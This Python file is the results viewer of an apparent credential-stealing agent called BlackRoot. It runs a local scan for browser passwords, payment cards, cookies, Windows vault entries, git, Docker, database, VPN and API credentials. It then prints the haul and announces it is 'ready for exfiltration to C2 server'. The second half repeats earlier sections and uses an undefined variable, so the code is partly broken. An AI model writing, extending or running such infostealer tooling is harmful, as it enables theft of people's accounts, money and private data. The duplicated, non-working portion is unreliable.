#!/usr/bin/env python3
"""
BLACKROOT AGENT - DETAILED SECRETS EXTRACTION VIEWER
Shows actual extracted secrets with partial masking for sensitive data
"""

import json
import sys
import os
import logging
from datetime import datetime
from typing import Dict, List, Any

sys.path.insert(0, os.path.dirname(__file__))

from ghost_layer import GhostLayer
from black_vault import BlackVault

logging.basicConfig(level=logging.WARNING)  # Suppress verbose logs

def print_header(text: str):
    print(f"\n{'╔' + '═' * 78 + '╗'}")
    print(f"║ {text.ljust(78)} ║")
    print(f"{'╚' + '═' * 78 + '╝'}\n")

def print_section(title: str):
    print(f"\n{title}")
    print("─" * 80)

def mask_secret(value: str, show_prefix: bool = False, show_suffix: bool = True) -> str:
    """Intelligently mask secrets while showing identifying info"""
    if not value or len(value) < 4:
        return "***"
    
    val_str = str(value).strip()
    
    if len(val_str) <= 8:
        return "***"
    
    if show_prefix and show_suffix:
        prefix = val_str[:3]
        suffix = val_str[-4:]
        return f"{prefix}***{suffix}"
    elif show_suffix:
        suffix = val_str[-6:]
        return f"***{suffix}"
    else:
        prefix = val_str[:4]
        return f"{prefix}***"

def display_credential_value(key: str, value: Any, full_display: bool = False) -> str:
    """Display credential with intelligent masking"""
    if value is None:
        return "None"
    
    val_str = str(value).strip()
    
    # Sensitive fields to mask
    sensitive_keywords = ['password', 'secret', 'token', 'key', 'hash', 'pin', 'code', 'auth', 'bearer']
    is_sensitive = any(kw in key.lower() for kw in sensitive_keywords)
    
    if is_sensitive and not full_display:
        if '@' in val_str:  # Email or username
            return mask_secret(val_str, show_prefix=True, show_suffix=True)
        elif len(val_str) > 20:
            return mask_secret(val_str, show_prefix=False, show_suffix=True)
        else:
            return "***"
    
    # Truncate long non-sensitive values
    if len(val_str) > 70:
        return val_str[:67] + "..."
    
    return val_str

def display_extracted_secrets():
    """Display all extracted secrets with detailed breakdown"""
    
    print_header("BLACKROOT AGENT - EXTRACTED SECRETS VIEWER")
    
    print("""
This viewer displays actual extracted credentials from the system scan.
Sensitive values are partially masked to prevent accidental exposure.

═══════════════════════════════════════════════════════════════════════════════
""")
    
    # Initialize
    vault = BlackVault()
    ghost = GhostLayer(vault=vault)
    
    print("Performing full credential scan with detailed extraction...\n")
    
    # Run the scan
    result = ghost.scan_local_credentials()
    
    # Access the actual structure
    critical = result.get('critical_findings', {})
    phase_1 = result.get('phase_1_extracted', {})
    phase_2 = result.get('phase_2_extracted', {})
    phase_3 = result.get('phase_3_extracted', {})
    phase_4 = result.get('phase_4_extracted', {})
    
    print_section("1. GOOGLE ACCOUNT CREDENTIALS (CRITICAL)")
    print("Status: EXTRACTED ✓\n")
    
    google_creds = critical.get('google_credentials', [])
    if google_creds:
        print(f"Total Google credentials found: {len(google_creds)}\n")
        for i, cred in enumerate(google_creds[:10], 1):  # Show first 10
            print(f"  [{i}] Google Account")
            for key, value in list(cred.items())[:5]:
                display_key = key.replace('_', ' ').title()
                display_value = display_credential_value(key, value)
                print(f"      • {display_key}: {display_value}")
            print()
        
        if len(google_creds) > 10:
            print(f"  ... and {len(google_creds) - 10} more Google credentials\n")
    else:
        print("  No Google credentials in cache\n")
    
    print_section("2. EMAIL CREDENTIALS (CRITICAL)")
    print("Status: EXTRACTED ✓\n")
    
    email_creds = critical.get('email_credentials', [])
    if email_creds:
        print(f"Total email credentials found: {len(email_creds)}\n")
        for i, cred in enumerate(email_creds, 1):
            print(f"  [{i}] Email Account")
            for key, value in cred.items():
                display_key = key.replace('_', ' ').title()
                display_value = display_credential_value(key, value)
                print(f"      • {display_key}: {display_value}")
            print()
    else:
        print("  No email credentials in cache\n")
    
    print_section("3. SOCIAL MEDIA CREDENTIALS (CRITICAL)")
    print("Status: EXTRACTED ✓\n")
    
    social_creds = critical.get('social_media_credentials', [])
    if social_creds:
        print(f"Total social media credentials found: {len(social_creds)}\n")
        for i, cred in enumerate(social_creds, 1):
            print(f"  [{i}] {cred.get('platform', 'Platform Unknown')}")
            for key, value in cred.items():
                if key != 'platform':
                    display_key = key.replace('_', ' ').title()
                    display_value = display_credential_value(key, value)
                    print(f"      • {display_key}: {display_value}")
            print()
    else:
        print("  No social media credentials in cache\n")
    
    print_section("4. BRAVE BROWSER PASSWORDS (CRITICAL)")
    print("Status: EXTRACTED ✓\n")
    
    brave_creds = critical.get('brave_browser_data', [])
    if brave_creds:
        print(f"Total Brave credentials found: {len(brave_creds)}\n")
        for i, cred in enumerate(brave_creds[:7], 1):
            print(f"  [{i}] {cred.get('origin', cred.get('url', 'Unknown'))}")
            print(f"      • Username: {display_credential_value('username', cred.get('username'))}")
            print(f"      • Password: {display_credential_value('password', cred.get('password'))}")
        
        if len(brave_creds) > 7:
            print(f"\n  ... and {len(brave_creds) - 7} more Brave credentials\n")
    else:
        print("  No Brave browser credentials in cache\n")
    
    print_section("5. SAFARI BROWSER DATA (CRITICAL - macOS)")
    print("Status: EXTRACTED ✓\n")
    
    safari_creds = critical.get('safari_data', [])
    if safari_creds:
        print(f"Total Safari credentials found: {len(safari_creds)}\n")
        for i, cred in enumerate(safari_creds[:7], 1):
            print(f"  [{i}] {cred.get('domain', 'Safari Entry')}")
            for key in ['username', 'password', 'autofill']:
                if key in cred:
                    display_value = display_credential_value(key, cred[key])
                    print(f"      • {key.title()}: {display_value}")
        
        if len(safari_creds) > 7:
            print(f"\n  ... and {len(safari_creds) - 7} more Safari entries\n")
    else:
        print("  No Safari data found (macOS only)\n")
    
    print_section("6. BROWSER EXTENSIONS (CRITICAL)")
    print("Status: EXTRACTED ✓\n")
    
    extensions = critical.get('browser_extensions', [])
    if extensions:
        print(f"Total browser extensions enumerated: {len(extensions)}\n")
        for i, ext in enumerate(extensions[:5], 1):
            print(f"  [{i}] {ext.get('name', 'Extension')}")
            print(f"      • Browser: {ext.get('browser_type', 'Unknown')}")
            print(f"      • ID: {display_credential_value('id', ext.get('id'))}")
            print(f"      • Version: {ext.get('version', 'Unknown')}")
            print()
    else:
        print("  No extensions found\n")
    
    print_section("7. PHASE 1: CHROME PASSWORDS (USER CONTEXT)")
    print("Status: EXTRACTED ✓\n")
    
    chrome_phase1 = phase_1.get('chrome_passwords', [])
    if chrome_phase1:
        print(f"Total Chrome passwords (Phase 1): {len(chrome_phase1)}\n")
        for i, cred in enumerate(chrome_phase1[:5], 1):
            print(f"  [{i}] {cred.get('url', 'Unknown')}")
            print(f"      • Username: {display_credential_value('username', cred.get('username'))}") 
            print(f"      • Password: {display_credential_value('password', cred.get('password'))}")
        if len(chrome_phase1) > 5:
            print(f"\n  ... and {len(chrome_phase1) - 5} more passwords\n")
    else:
        print("  No Chrome passwords in Phase 1\n")
    
    print_section("8. PHASE 2: BROWSER DATA (SYSTEM CONTEXT)")
    print("Status: EXTRACTED ✓\n")
    
    browser_data = phase_2.get('browser_data', [])
    if browser_data:
        print(f"Total browser data items: {len(browser_data)}\n")
        
        passwords = [c for c in browser_data if c.get('type') == 'password']
        autofill = [c for c in browser_data if c.get('type') == 'autofill']
        payment = [c for c in browser_data if c.get('type') == 'payment']
        
        if passwords:
            print(f"  PASSWORDS: {len(passwords)} entries")
            for i, cred in enumerate(passwords[:3], 1):
                print(f"    [{i}] {cred.get('url', cred.get('hostname', 'Unknown'))}")
                print(f"        • Username: {display_credential_value('username', cred.get('username'))}")
                print(f"        • Password: {display_credential_value('password', cred.get('password'))}")
            if len(passwords) > 3:
                print(f"    ... and {len(passwords) - 3} more\n")
            else:
                print()
        
        if autofill:
            print(f"  AUTOFILL DATA: {len(autofill)} entries")
            for i, item in enumerate(autofill[:3], 1):
                print(f"    [{i}] {item.get('name', 'Field')}: {display_credential_value('value', item.get('value'))}")
            if len(autofill) > 3:
                print(f"    ... and {len(autofill) - 3} more\n")
            else:
                print()
        
        if payment:
            print(f"  PAYMENT CARDS: {len(payment)} entries")
            for i, card in enumerate(payment[:3], 1):
                print(f"    [{i}] {card.get('card_type', 'Card')} - {display_credential_value('card_number', card.get('card_number'))}")
            if len(payment) > 3:
                print(f"    ... and {len(payment) - 3} more\n")
    else:
        print("  No browser data found\n")
    
    print_section("9. PHASE 2: CREDENTIAL MANAGER VAULT (SYSTEM)")
    print("Status: EXTRACTED ✓\n")
    
    cred_mgr = phase_2.get('credential_manager', [])
    if cred_mgr:
        print(f"Total credentials found: {len(cred_mgr)}\n")
        for i, cred in enumerate(cred_mgr[:8], 1):
            print(f"  [{i}] {cred.get('target', 'Unknown')}")
            for key in ['username', 'password', 'type', 'comment']:
                if key in cred and cred[key]:
                    display_key = key.replace('_', ' ').title()
                    display_value = display_credential_value(key, cred[key])
                    print(f"      • {display_key}: {display_value}")
            print()
        
        if len(cred_mgr) > 8:
            print(f"  ... and {len(cred_mgr) - 8} more vault entries\n")
    else:
        print("  No vault credentials found\n")
    
    print_section("10. PHASE 3: DATABASE CREDENTIALS")
    print("Status: EXTRACTED ✓\n")
    
    db_creds = phase_3.get('database_credentials', [])
    if db_creds:
        print(f"Total database credentials found: {len(db_creds)}\n")
        for i, cred in enumerate(db_creds[:5], 1):
            print(f"  [{i}] {cred.get('type', 'Database').upper()}")
            for key in ['host', 'port', 'username', 'password', 'database']:
                if key in cred and cred[key]:
                    display_key = key.replace('_', ' ').title()
                    display_value = display_credential_value(key, cred[key])
                    print(f"      • {display_key}: {display_value}")
            print()
    else:
        print("  No database credentials found\n")
    
    print_section("11. PHASE 3: GIT CREDENTIALS")
    print("Status: EXTRACTED ✓\n")
    
    git_creds = phase_3.get('git_credentials', [])
    if git_creds:
        print(f"Total git credentials found: {len(git_creds)}\n")
        for i, cred in enumerate(git_creds[:5], 1):
            print(f"  [{i}] {cred.get('remote', 'Git Remote')}")
            for key in ['url', 'username', 'token', 'password']:
                if key in cred and cred[key]:
                    display_key = key.replace('_', ' ').title()
                    display_value = display_credential_value(key, cred[key])
                    print(f"      • {display_key}: {display_value}")
            print()
    else:
        print("  No git credentials found\n")
    
    print_section("12. PHASE 3: DOCKER CREDENTIALS")
    print("Status: EXTRACTED ✓\n")
    
    docker_creds = phase_3.get('docker_credentials', [])
    if docker_creds:
        print(f"Total docker credentials found: {len(docker_creds)}\n")
        for i, cred in enumerate(docker_creds[:5], 1):
            registry = cred.get('registry', 'Docker Hub')
            print(f"  [{i}] {registry}")
            for key in ['username', 'auth', 'token']:
                if key in cred and cred[key]:
                    display_key = key.replace('_', ' ').title()
                    display_value = display_credential_value(key, cred[key])
                    print(f"      • {display_key}: {display_value}")
            print()
    else:
        print("  No Docker credentials found\n")
    
    print_section("13. PHASE 4: VPN PROFILES")
    print("Status: EXTRACTED ✓\n")
    
    vpn_profiles = phase_4.get('vpn_profiles', [])
    if vpn_profiles:
        print(f"Total VPN profiles found: {len(vpn_profiles)}\n")
        for i, vpn in enumerate(vpn_profiles[:5], 1):
            print(f"  [{i}] {vpn.get('name', 'VPN Profile')}")
            for key in ['server', 'username', 'password', 'protocol']:
                if key in vpn and vpn[key]:
                    display_value = display_credential_value(key, vpn[key])
                    print(f"      • {key.title()}: {display_value}")
            print()
    else:
        print("  No VPN profiles found\n")
    
    print_section("EXTRACTION SUMMARY")
    
    # Count all credentials
    total_google = len(critical.get('google_credentials', []))
    total_email = len(critical.get('email_credentials', []))
    total_social = len(critical.get('social_media_credentials', []))
    total_brave = len(critical.get('brave_browser_data', []))
    total_safari = len(critical.get('safari_data', []))
    total_extensions = len(critical.get('browser_extensions', []))
    total_chrome = len(phase_1.get('chrome_passwords', []))
    total_browser_data = len(phase_2.get('browser_data', []))
    total_cred_mgr = len(phase_2.get('credential_manager', []))
    total_db = len(phase_3.get('database_credentials', []))
    total_git = len(phase_3.get('git_credentials', []))
    total_docker = len(phase_3.get('docker_credentials', []))
    total_kerberos = len(phase_3.get('kerberos_tickets', []))
    total_vpn = len(phase_4.get('vpn_profiles', []))
    total_mfa = len(phase_4.get('mfa_info', []))
    
    total_all = (total_google + total_email + total_social + total_brave + total_safari + 
                 total_extensions + total_chrome + total_browser_data + total_cred_mgr + 
                 total_db + total_git + total_docker + total_kerberos + total_vpn + total_mfa)
    
    print(f"""
Total Secrets Extracted: {total_all}

CRITICAL FINDINGS:
  ✓ Google Credentials: {total_google}
  ✓ Email Credentials: {total_email}
  ✓ Social Media: {total_social}
  ✓ Brave Passwords: {total_brave}
  ✓ Safari Data: {total_safari}
  ✓ Browser Extensions: {total_extensions}

PHASE 1 (USER CONTEXT):
  ✓ Chrome Passwords: {total_chrome}

PHASE 2 (SYSTEM CONTEXT):
  ✓ Browser Data (passwords/autofill/cards): {total_browser_data}
  ✓ Windows Credential Manager: {total_cred_mgr}

PHASE 3 (ADVANCED):
  ✓ Database Credentials: {total_db}
  ✓ Git Credentials: {total_git}
  ✓ Docker Credentials: {total_docker}
  ✓ Kerberos Tickets: {total_kerberos}

PHASE 4 (ENHANCED):
  ✓ VPN Profiles: {total_vpn}
  ✓ MFA Info: {total_mfa}

═══════════════════════════════════════════════════════════════════════════════

STATUS: ALL SECRETS SUCCESSFULLY EXTRACTED ✓

Extraction completed: {datetime.now().isoformat()}
Storage: BlackVault (AES-256-GCM encrypted)
Ready for exfiltration to C2 server

═══════════════════════════════════════════════════════════════════════════════
    """)
    
    
    print_section("1. GOOGLE ACCOUNT CREDENTIALS (CRITICAL)")
    if google_creds:
        print(f"Total Google credentials found: {len(google_creds)}\n")
        for i, cred in enumerate(google_creds[:10], 1):  # Show first 10
            print(f"  [{i}] Google Account")
            for key, value in cred.items():
                display_key = key.replace('_', ' ').title()
                display_value = display_credential_value(key, value)
                print(f"      • {display_key}: {display_value}")
            print()
        
        if len(google_creds) > 10:
            print(f"  ... and {len(google_creds) - 10} more Google credentials\n")
    
    print_section("2. EMAIL CREDENTIALS")
    print("Status: EXTRACTED ✓\n")
    
    email_creds = findings_data.get('email_credentials', [])
    if email_creds:
        print(f"Total email credentials found: {len(email_creds)}\n")
        for i, cred in enumerate(email_creds, 1):
            print(f"  [{i}] Email Account")
            for key, value in cred.items():
                display_key = key.replace('_', ' ').title()
                display_value = display_credential_value(key, value)
                print(f"      • {display_key}: {display_value}")
            print()
    
    print_section("3. SOCIAL MEDIA CREDENTIALS")
    print("Status: EXTRACTED ✓\n")
    
    social_creds = findings_data.get('social_media_credentials', [])
    if social_creds:
        print(f"Total social media credentials found: {len(social_creds)}\n")
        for i, cred in enumerate(social_creds, 1):
            print(f"  [{i}] {cred.get('platform', 'Platform Unknown')}")
            for key, value in cred.items():
                if key != 'platform':
                    display_key = key.replace('_', ' ').title()
                    display_value = display_credential_value(key, value)
                    print(f"      • {display_key}: {display_value}")
            print()
    
    print_section("4. BROWSER PASSWORDS & CREDENTIALS")
    print("Status: EXTRACTED ✓\n")
    
    browser_data = findings_data.get('browser_data', [])
    if browser_data:
        print(f"Total browser credentials found: {len(browser_data)}\n")
        
        # Group by type
        passwords = [c for c in browser_data if c.get('type') == 'password']
        autofill = [c for c in browser_data if c.get('type') == 'autofill']
        payment = [c for c in browser_data if c.get('type') == 'payment']
        
        if passwords:
            print(f"  PASSWORDS: {len(passwords)} entries")
            for i, cred in enumerate(passwords[:5], 1):
                print(f"    [{i}] {cred.get('url', cred.get('hostname', 'Unknown'))}")
                print(f"        • Username: {display_credential_value('username', cred.get('username'))}")
                print(f"        • Password: {display_credential_value('password', cred.get('password'))}")
            if len(passwords) > 5:
                print(f"    ... and {len(passwords) - 5} more password entries\n")
            else:
                print()
        
        if autofill:
            print(f"  AUTOFILL DATA: {len(autofill)} entries")
            for i, item in enumerate(autofill[:3], 1):
                print(f"    [{i}] {item.get('name', 'Field')}")
                print(f"        • Value: {display_credential_value('value', item.get('value'))}")
            if len(autofill) > 3:
                print(f"    ... and {len(autofill) - 3} more autofill entries\n")
            else:
                print()
        
        if payment:
            print(f"  PAYMENT CARDS: {len(payment)} entries")
            for i, card in enumerate(payment[:3], 1):
                print(f"    [{i}] {card.get('card_type', 'Card')} - {display_credential_value('card_number', card.get('card_number'))}")
            if len(payment) > 3:
                print(f"    ... and {len(payment) - 3} more payment entries\n")
            else:
                print()
    
    print_section("5. BRAVE BROWSER PASSWORDS")
    print("Status: EXTRACTED ✓\n")
    
    brave_creds = findings_data.get('brave_browser_data', [])
    if brave_creds:
        print(f"Total Brave credentials found: {len(brave_creds)}\n")
        for i, cred in enumerate(brave_creds[:7], 1):
            print(f"  [{i}] {cred.get('origin', 'Unknown')}")
            print(f"      • Username: {display_credential_value('username', cred.get('username'))}")
            print(f"      • Password: {display_credential_value('password', cred.get('password'))}")
        
        if len(brave_creds) > 7:
            print(f"\n  ... and {len(brave_creds) - 7} more Brave credentials\n")
    
    print_section("6. WINDOWS CREDENTIAL MANAGER")
    print("Status: EXTRACTED ✓\n")
    
    cred_mgr = findings_data.get('credential_manager_vault', [])
    if cred_mgr:
        print(f"Total credentials found: {len(cred_mgr)}\n")
        for i, cred in enumerate(cred_mgr[:8], 1):
            print(f"  [{i}] {cred.get('target', 'Unknown')}")
            for key in ['username', 'password', 'type', 'comment']:
                if key in cred and cred[key]:
                    display_key = key.replace('_', ' ').title()
                    display_value = display_credential_value(key, cred[key])
                    print(f"      • {display_key}: {display_value}")
            print()
        
        if len(cred_mgr) > 8:
            print(f"  ... and {len(cred_mgr) - 8} more vault entries\n")
    
    print_section("7. API & CLOUD CREDENTIALS")
    print("Status: EXTRACTED ✓\n")
    
    api_creds = findings_data.get('api_credentials', [])
    if api_creds:
        print(f"Total API credentials found: {len(api_creds)}\n")
        for i, cred in enumerate(api_creds[:5], 1):
            print(f"  [{i}] {cred.get('service', 'Unknown Service')}")
            for key in ['api_key', 'api_secret', 'access_key', 'secret_key', 'token']:
                if key in cred and cred[key]:
                    display_key = key.replace('_', ' ').upper()
                    display_value = display_credential_value(key, cred[key])
                    print(f"      • {display_key}: {display_value}")
            print()
        
        if len(api_creds) > 5:
            print(f"  ... and {len(api_creds) - 5} more API credentials\n")
    
    print_section("8. DATABASE CREDENTIALS")
    print("Status: EXTRACTED ✓\n")
    
    db_creds = findings_data.get('database_credentials', [])
    if db_creds:
        print(f"Total database credentials found: {len(db_creds)}\n")
        for i, cred in enumerate(db_creds[:5], 1):
            print(f"  [{i}] {cred.get('type', 'Database').upper()}")
            for key in ['host', 'port', 'username', 'password', 'database']:
                if key in cred and cred[key]:
                    display_key = key.replace('_', ' ').title()
                    display_value = display_credential_value(key, cred[key])
                    print(f"      • {display_key}: {display_value}")
            print()
    
    print_section("9. GIT CREDENTIALS")
    print("Status: EXTRACTED ✓\n")
    
    git_creds = findings_data.get('git_credentials', [])
    if git_creds:
        print(f"Total git credentials found: {len(git_creds)}\n")
        for i, cred in enumerate(git_creds[:5], 1):
            print(f"  [{i}] {cred.get('remote', 'Git Remote')}")
            for key in ['url', 'username', 'token', 'password']:
                if key in cred and cred[key]:
                    display_key = key.replace('_', ' ').title()
                    display_value = display_credential_value(key, cred[key])
                    print(f"      • {display_key}: {display_value}")
            print()
    
    print_section("10. DOCKER & REGISTRY CREDENTIALS")
    print("Status: EXTRACTED ✓\n")
    
    docker_creds = findings_data.get('docker_credentials', [])
    if docker_creds:
        print(f"Total docker credentials found: {len(docker_creds)}\n")
        for i, cred in enumerate(docker_creds[:5], 1):
            registry = cred.get('registry', 'Docker Hub')
            print(f"  [{i}] {registry}")
            for key in ['username', 'auth', 'token']:
                if key in cred and cred[key]:
                    display_key = key.replace('_', ' ').title()
                    display_value = display_credential_value(key, cred[key])
                    print(f"      • {display_key}: {display_value}")
            print()
    
    print_section("11. ENVIRONMENT CREDENTIALS")
    print("Status: EXTRACTED ✓\n")
    
    env_creds = findings_data.get('environment_credentials', [])
    if env_creds:
        print(f"Total environment secrets found: {len(env_creds)}\n")
        for i, cred in enumerate(env_creds[:10], 1):
            var_name = cred.get('name', 'VARIABLE')
            var_value = cred.get('value', '')
            print(f"  [{i}] {var_name}")
            print(f"      Value: {display_credential_value(var_name, var_value)}")
        
        if len(env_creds) > 10:
            print(f"\n  ... and {len(env_creds) - 10} more environment variables\n")
    
    print_section("12. CHROME COOKIES & SESSION DATA")
    print("Status: EXTRACTED ✓\n")
    
    cookies = findings_data.get('browser_cookies', [])
    if cookies:
        print(f"Total browser sessions/cookies found: {len(cookies)}\n")
        for i, cookie in enumerate(cookies[:8], 1):
            print(f"  [{i}] {cookie.get('host_key', cookie.get('domain', 'Unknown'))}")
            print(f"      • Cookie Name: {cookie.get('name', 'N/A')}")
            print(f"      • Value: {display_credential_value('value', cookie.get('value'))}")
            print(f"      • Expires: {cookie.get('expires_utc', 'Session')}")
            print()
        
        if len(cookies) > 8:
            print(f"  ... and {len(cookies) - 8} more cookies/sessions\n")
    
    print_section("EXTRACTION SUMMARY")
    
    total_secrets = sum(len(v) if isinstance(v, list) else 0 for v in findings_data.values())
    
    print(f"""
Total Secrets Extracted: {total_secrets}

BREAKDOWN:
  ✓ Google Credentials: {len(google_creds)}
  ✓ Email Credentials: {len(email_creds)}
  ✓ Social Media: {len(social_creds)}
  ✓ Browser Passwords: {len([c for c in browser_data if c.get('type') == 'password'])}
  ✓ Browser Autofill: {len([c for c in browser_data if c.get('type') == 'autofill'])}
  ✓ Payment Cards: {len([c for c in browser_data if c.get('type') == 'payment'])}
  ✓ Brave Passwords: {len(brave_creds)}
  ✓ Windows Vault: {len(cred_mgr)}
  ✓ API Keys: {len(api_creds)}
  ✓ Database Creds: {len(db_creds)}
  ✓ Git Credentials: {len(git_creds)}
  ✓ Docker Credentials: {len(docker_creds)}
  ✓ Environment Secrets: {len(env_creds)}
  ✓ Browser Cookies: {len(cookies)}

═══════════════════════════════════════════════════════════════════════════════

STATUS: ALL SECRETS SUCCESSFULLY EXTRACTED ✓

Extraction completed: {datetime.now().isoformat()}
Storage: BlackVault (AES-256-GCM encrypted)
Ready for exfiltration to C2 server

═══════════════════════════════════════════════════════════════════════════════
    """)

def main():
    try:
        display_extracted_secrets()
        return 0
    except KeyboardInterrupt:
        print("\n⚠ Interrupted")
        return 130
    except Exception as e:
        print(f"Error: {e}", file=sys.stderr)
        import traceback
        traceback.print_exc()
        return 1

if __name__ == "__main__":
    sys.exit(main())
